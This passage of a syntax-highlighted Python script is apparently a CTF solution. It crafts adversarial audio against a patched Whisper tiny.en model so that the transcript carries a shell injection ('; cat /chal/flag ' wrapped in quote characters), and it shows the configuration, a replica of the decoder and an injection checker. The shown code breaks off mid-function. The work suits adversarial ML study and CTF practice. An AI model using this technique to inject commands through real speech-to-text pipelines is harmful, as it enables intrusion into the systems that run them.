</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=14><a style=outline:none;text-decoration:none;color:inherit href=#14>14</a></span><span><span style=color:#f1fa8c>  • and either a &#39;#&#39; somewhere after it or a trailing apostrophe.
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=15><a style=outline:none;text-decoration:none;color:inherit href=#15>15</a></span><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=16><a style=outline:none;text-decoration:none;color:inherit href=#16>16</a></span><span><span style=color:#f1fa8c>The attack is white-box: we backpropagate through Whisper&#39;s encoder+decoder
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=17><a style=outline:none;text-decoration:none;color:inherit href=#17>17</a></span><span><span style=color:#f1fa8c>(logits) with a teacher-forced cross-entropy loss on the injection command
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=18><a style=outline:none;text-decoration:none;color:inherit href=#18>18</a></span><span><span style=color:#f1fa8c>tokens, and use the model&#39;s own greedy argmax decoder (matching the …</span></span></span></code></pre></div></div><div class=full style=display:none><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=1><a style=outline:none;text-decoration:none;color:inherit href=#1>  1</a></span><span><span style=color:#6272a4>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=2><a style=outline:none;text-decoration:none;color:inherit href=#2>  2</a></span><span><span style=color:#f1fa8c>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=3><a style=outline:none;text-decoration:none;color:inherit href=#3>  3</a></span><span><span style=color:#f1fa8c>whitebox_adversarial_whisper.py
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=4><a style=outline:none;text-decoration:none;color:inherit href=#4>  4</a></span><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=5><a style=outline:none;text-decoration:none;color:inherit href=#5>  5</a></span><span><span style=color:#f1fa8c>Adversarial audio attack on the patched Whisper-20231117 tiny.en model.
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=6><a style=outline:none;text-decoration:none;color:inherit href=#6>  6</a></span><span><span style=color:#f1fa8c>Generates an audio file that, when run through the exact same CLI:
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=7><a style=outline:none;text-decoration:none;color:inherit href=#7>  7</a></span><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=8><a style=outline:none;text-decoration:none;color:inherit href=#8>  8</a></span><span><span style=color:#f1fa8c>    python3 whisper.py --model tiny.en --language English --best_of 5 --beam_size None exploit.wav
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=9><a style=outline:none;text-decoration:none;color:inherit href=#9>  9</a></span><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=10><a style=outline:none;text-decoration:none;color:inherit href=#10> 10</a></span><span><span style=color:#f1fa8c>will produce a transcript containing:
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=11><a style=outline:none;text-decoration:none;color:inherit href=#11> 11</a></span><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=12><a style=outline:none;text-decoration:none;color:inherit href=#12> 12</a></span><span><span style=color:#f1fa8c>  • at least one apostrophe (&#39;)  
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=13><a style=outline:none;text-decoration:none;color:inherit href=#13> 13</a></span><span><span style=color:#f1fa8c>  • the substring &#34;; cat /chal/flag &#34;  
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=14><a style=outline:none;text-decoration:none;color:inherit href=#14> 14</a></span><span><span style=color:#f1fa8c>  • and either a &#39;#&#39; somewhere after it or a trailing apostrophe.
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=15><a style=outline:none;text-decoration:none;color:inherit href=#15> 15</a></span><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=16><a style=outline:none;text-decoration:none;color:inherit href=#16> 16</a></span><span><span style=color:#f1fa8c>The attack is white-box: we backpropagate through Whisper&#39;s encoder+decoder
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=17><a style=outline:none;text-decoration:none;color:inherit href=#17> 17</a></span><span><span style=color:#f1fa8c>(logits) with a teacher-forced cross-entropy loss on the injection command
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=18><a style=outline:none;text-decoration:none;color:inherit href=#18> 18</a></span><span><span style=color:#f1fa8c>tokens, and use the model&#39;s own greedy argmax decoder (matching the CTF patch)
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=19><a style=outline:none;text-decoration:none;color:inherit href=#19> 19</a></span><span><span style=color:#f1fa8c>to check progress at each step.
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=20><a style=outline:none;text-decoration:none;color:inherit href=#20> 20</a></span><span><span style=color:#f1fa8c>&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=21><a style=outline:none;text-decoration:none;color:inherit href=#21> 21</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=22><a style=outline:none;text-decoration:none;color:inherit href=#22> 22</a></span><span><span style=color:#ff79c6>import</span> os
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=23><a style=outline:none;text-decoration:none;color:inherit href=#23> 23</a></span><span><span style=color:#ff79c6>import</span> torch
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=24><a style=outline:none;text-decoration:none;color:inherit href=#24> 24</a></span><span><span style=color:#ff79c6>import</span> torchaudio
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=25><a style=outline:none;text-decoration:none;color:inherit href=#25> 25</a></span><span><span style=color:#ff79c6>import</span> tqdm
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=26><a style=outline:none;text-decoration:none;color:inherit href=#26> 26</a></span><span><span style=color:#ff79c6>import</span> whisper
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=27><a style=outline:none;text-decoration:none;color:inherit href=#27> 27</a></span><span><span style=color:#ff79c6>from</span> whisper.tokenizer <span style=color:#ff79c6>import</span> get_tokenizer
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=28><a style=outline:none;text-decoration:none;color:inherit href=#28> 28</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=29><a style=outline:none;text-decoration:none;color:inherit href=#29> 29</a></span><span><span style=color:#6272a4># ───────── CONFIGURATION ──────────────────────────────────────────────────</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=30><a style=outline:none;text-decoration:none;color:inherit href=#30> 30</a></span><span>MODEL_NAME   <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;tiny.en&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=31><a style=outline:none;text-decoration:none;color:inherit href=#31> 31</a></span><span>SAMPLE_RATE  <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>41_000</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=32><a style=outline:none;text-decoration:none;color:inherit href=#32> 32</a></span><span>DURATION_SEC <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>5</span>                 <span style=color:#6272a4># initial waveform length in seconds</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=33><a style=outline:none;text-decoration:none;color:inherit href=#33> 33</a></span><span>MAX_STEPS    <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>30_000</span>            <span style=color:#6272a4># total training iterations</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=34><a style=outline:none;text-decoration:none;color:inherit href=#34> 34</a></span><span>LR           <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1e-3</span>              <span style=color:#6272a4># Adam learning rate</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=35><a style=outline:none;text-decoration:none;color:inherit href=#35> 35</a></span><span>SAVE_EVERY   <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>2_500</span>             <span style=color:#6272a4># checkpoint interval</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=36><a style=outline:none;text-decoration:none;color:inherit href=#36> 36</a></span><span>CKPT_FILE    <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;adv_whisper.pt&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=37><a style=outline:none;text-decoration:none;color:inherit href=#37> 37</a></span><span>OUTPUT_WAV   <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;exploit.wav&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=38><a style=outline:none;text-decoration:none;color:inherit href=#38> 38</a></span><span>SEED_WAV     <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;rickroll.wav&#34;</span>    <span style=color:#6272a4># comment this out to use a random wave</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=39><a style=outline:none;text-decoration:none;color:inherit href=#39> 39</a></span><span>DEVICE       <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;cuda&#34;</span> <span style=color:#ff79c6>if</span> torch<span style=color:#ff79c6>.</span>cuda<span style=color:#ff79c6>.</span>is_available() <span style=color:#ff79c6>else</span> <span style=color:#f1fa8c>&#34;cpu&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=40><a style=outline:none;text-decoration:none;color:inherit href=#40> 40</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=41><a style=outline:none;text-decoration:none;color:inherit href=#41> 41</a></span><span><span style=color:#6272a4># The injection we want in the final transcript</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=42><a style=outline:none;text-decoration:none;color:inherit href=#42> 42</a></span><span>INJECTION_CMD <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;; cat /chal/flag &#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=43><a style=outline:none;text-decoration:none;color:inherit href=#43> 43</a></span><span><span style=color:#6272a4># We only require: some text + &#39; + any text + INJECTION_CMD + any text + (# or trailing &#39;)</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=44><a style=outline:none;text-decoration:none;color:inherit href=#44> 44</a></span><span><span style=color:#6272a4># so we look for INJECTION_CMD, ensure a &#39; before it, and a # or trailing &#39; after it.</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=45><a style=outline:none;text-decoration:none;color:inherit href=#45> 45</a></span><span><span style=color:#6272a4># ──────────────────────────────────────────────────────────────────────────</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=46><a style=outline:none;text-decoration:none;color:inherit href=#46> 46</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=47><a style=outline:none;text-decoration:none;color:inherit href=#47> 47</a></span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>log_mel</span>(wave: torch<span style=color:#ff79c6>.</span>Tensor) <span style=color:#ff79c6>-&gt;</span> torch<span style=color:#ff79c6>.</span>Tensor:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=48><a style=outline:none;text-decoration:none;color:inherit href=#48> 48</a></span><span>    <span style=color:#f1fa8c>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=49><a style=outline:none;text-decoration:none;color:inherit href=#49> 49</a></span><span><span style=color:#f1fa8c>    Compute Whisper&#39;s log-mel spectrogram and pad/truncate to the model&#39;s context length.
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=50><a style=outline:none;text-decoration:none;color:inherit href=#50> 50</a></span><span><span style=color:#f1fa8c>    Input: wave of shape (1, N)
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=51><a style=outline:none;text-decoration:none;color:inherit href=#51> 51</a></span><span><span style=color:#f1fa8c>    Output: mel of shape (80, MEL_LEN)
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=52><a style=outline:none;text-decoration:none;color:inherit href=#52> 52</a></span><span><span style=color:#f1fa8c>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=53><a style=outline:none;text-decoration:none;color:inherit href=#53> 53</a></span><span>    mel <span style=color:#ff79c6>=</span> whisper<span style=color:#ff79c6>.</span>log_mel_spectrogram(wave<span style=color:#ff79c6>.</span>squeeze(<span style=color:#bd93f9>0</span>))<span style=color:#ff79c6>.</span>to(DEVICE)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=54><a style=outline:none;text-decoration:none;color:inherit href=#54> 54</a></span><span>    ctx    <span style=color:#ff79c6>=</span> model<span style=color:#ff79c6>.</span>encoder<span style=color:#ff79c6>.</span>positional_embedding<span style=color:#ff79c6>.</span>size(<span style=color:#bd93f9>0</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=55><a style=outline:none;text-decoration:none;color:inherit href=#55> 55</a></span><span>    stride <span style=color:#ff79c6>=</span> model<span style=color:#ff79c6>.</span>encoder<span style=color:#ff79c6>.</span>conv1<span style=color:#ff79c6>.</span>stride[<span style=color:#bd93f9>0</span>] <span style=color:#ff79c6>*</span> model<span style=color:#ff79c6>.</span>encoder<span style=color:#ff79c6>.</span>conv2<span style=color:#ff79c6>.</span>stride[<span style=color:#bd93f9>0</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=56><a style=outline:none;text-decoration:none;color:inherit href=#56> 56</a></span><span>    mel_len <span style=color:#ff79c6>=</span> ctx <span style=color:#ff79c6>*</span> stride
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=57><a style=outline:none;text-decoration:none;color:inherit href=#57> 57</a></span><span>    <span style=color:#ff79c6>if</span> mel<span style=color:#ff79c6>.</span>size(<span style=color:#bd93f9>1</span>) <span style=color:#ff79c6>&lt;</span> mel_len:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=58><a style=outline:none;text-decoration:none;color:inherit href=#58> 58</a></span><span>        mel <span style=color:#ff79c6>=</span> torch<span style=color:#ff79c6>.</span>nn<span style=color:#ff79c6>.</span>functional<span style=color:#ff79c6>.</span>pad(mel, (<span style=color:#bd93f9>0</span>, mel_len <span style=color:#ff79c6>-</span> mel<span style=color:#ff79c6>.</span>size(<span style=color:#bd93f9>1</span>)))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=59><a style=outline:none;text-decoration:none;color:inherit href=#59> 59</a></span><span>    <span style=color:#ff79c6>return</span> mel[:, :mel_len]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=60><a style=outline:none;text-decoration:none;color:inherit href=#60> 60</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=61><a style=outline:none;text-decoration:none;color:inherit href=#61> 61</a></span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>patched_decode</span>(wave: torch<span style=color:#ff79c6>.</span>Tensor) <span style=color:#ff79c6>-&gt;</span> <span style=color:#8be9fd;font-style:italic>str</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=62><a style=outline:none;text-decoration:none;color:inherit href=#62> 62</a></span><span>    <span style=color:#f1fa8c>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=63><a style=outline:none;text-decoration:none;color:inherit href=#63> 63</a></span><span><span style=color:#f1fa8c>    Replicate the CTF&#39;s patched decoder:
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=64><a style=outline:none;text-decoration:none;color:inherit href=#64> 64</a></span><span><span style=color:#f1fa8c>      • Greedy argmax, max length = target length
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=65><a style=outline:none;text-decoration:none;color:inherit href=#65> 65</a></span><span><span style=color:#f1fa8c>      • No beam or fallback logic
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=66><a style=outline:none;text-decoration:none;color:inherit href=#66> 66</a></span><span><span style=color:#f1fa8c>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=67><a style=outline:none;text-decoration:none;color:inherit href=#67> 67</a></span><span>    mel <span style=color:#ff79c6>=</span> log_mel(wave)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=68><a style=outline:none;text-decoration:none;color:inherit href=#68> 68</a></span><span>    feats <span style=color:#ff79c6>=</span> model<span style=color:#ff79c6>.</span>encoder(mel<span style=color:#ff79c6>.</span>unsqueeze(<span style=color:#bd93f9>0</span>))  <span style=color:#6272a4># (1, T, C)</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=69><a style=outline:none;text-decoration:none;color:inherit href=#69> 69</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=70><a style=outline:none;text-decoration:none;color:inherit href=#70> 70</a></span><span>    tokens <span style=color:#ff79c6>=</span> torch<span style=color:#ff79c6>.</span>tensor([[tokenizer<span style=color:#ff79c6>.</span>sot]], device<span style=color:#ff79c6>=</span>DEVICE)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=71><a style=outline:none;text-decoration:none;color:inherit href=#71> 71</a></span><span>    max_len <span style=color:#ff79c6>=</span> TARGET_IDS<span style=color:#ff79c6>.</span>size(<span style=color:#bd93f9>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=72><a style=outline:none;text-decoration:none;color:inherit href=#72> 72</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=73><a style=outline:none;text-decoration:none;color:inherit href=#73> 73</a></span><span>    <span style=color:#ff79c6>for</span> _ <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(max_len):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=74><a style=outline:none;text-decoration:none;color:inherit href=#74> 74</a></span><span>        logits <span style=color:#ff79c6>=</span> model<span style=color:#ff79c6>.</span>decoder(tokens, feats)[<span style=color:#bd93f9>0</span>, <span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>]  <span style=color:#6272a4># (vocab,)</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=75><a style=outline:none;text-decoration:none;color:inherit href=#75> 75</a></span><span>        nxt <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>int</span>(logits<span style=color:#ff79c6>.</span>argmax()<span style=color:#ff79c6>.</span>item())
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=76><a style=outline:none;text-decoration:none;color:inherit href=#76> 76</a></span><span>        tokens <span style=color:#ff79c6>=</span> torch<span style=color:#ff79c6>.</span>cat([tokens, torch<span style=color:#ff79c6>.</span>tensor([[nxt]], device<span style=color:#ff79c6>=</span>DEVICE)], dim<span style=color:#ff79c6>=</span><span style=color:#bd93f9>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=77><a style=outline:none;text-decoration:none;color:inherit href=#77> 77</a></span><span>        <span style=color:#ff79c6>if</span> nxt <span style=color:#ff79c6>==</span> tokenizer<span style=color:#ff79c6>.</span>eot:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=78><a style=outline:none;text-decoration:none;color:inherit href=#78> 78</a></span><span>            <span style=color:#ff79c6>break</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=79><a style=outline:none;text-decoration:none;color:inherit href=#79> 79</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=80><a style=outline:none;text-decoration:none;color:inherit href=#80> 80</a></span><span>    <span style=color:#ff79c6>return</span> tokenizer<span style=color:#ff79c6>.</span>decode(tokens[<span style=color:#bd93f9>0</span>]<span style=color:#ff79c6>.</span>tolist())<span style=color:#ff79c6>.</span>strip()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=81><a style=outline:none;text-decoration:none;color:inherit href=#81> 81</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=82><a style=outline:none;text-decoration:none;color:inherit href=#82> 82</a></span><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>meets_injection</span>(txt: <span style=color:#8be9fd;font-style:italic>str</span>) <span style=color:#ff79c6>-&gt;</span> <span style=color:#8be9fd;font-style:italic>bool</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=83><a style=outline:none;text-decoration:none;color:inherit href=#83> 83</a></span><span>    <span style=color:#f1fa8c>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=84><a style=outline:none;text-decoration:none;color:inherit href=#84> 84</a></span><span><span style=color:#f1fa8c>    Check that txt:
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=85><a style=outline:none;text-decoration:none;color:inherit href=#85> 85</a></span><span><span style=color:#f1fa8c>      1) contains INJECTION_CMD
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=86><a style=outline:none;text-decoration:none;color:inherit href=#86> 86</a></span><span><span style=color:#f1fa8c>      2) has at least one apostrophe before it
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=87><a style=outline:none;text-decoration:none;color:inherit href=#87> 87</a></span><span><span style=color:#f1fa8c>      3) has &#39;#&#39; after it or ends with an apostrophe
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=88><a style=outline:none;text-decoration:none;color:inherit href=#88> 88</a></span><span><span style=color:#f1fa8c>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=89><a style=outline:none;text-decoration:none;color:inherit href=#89> 89</a></span><span>    idx <span style=color:#ff79c6>=</span> txt<span style=color:#ff79c6>.</span>find(INJECTION_CMD)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=90><a style=outline:none;text-decoration:none;color:inherit href=#90> 90</a></span><span>    <span style=color:#ff79c6>if</span> idx <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>0</span>:
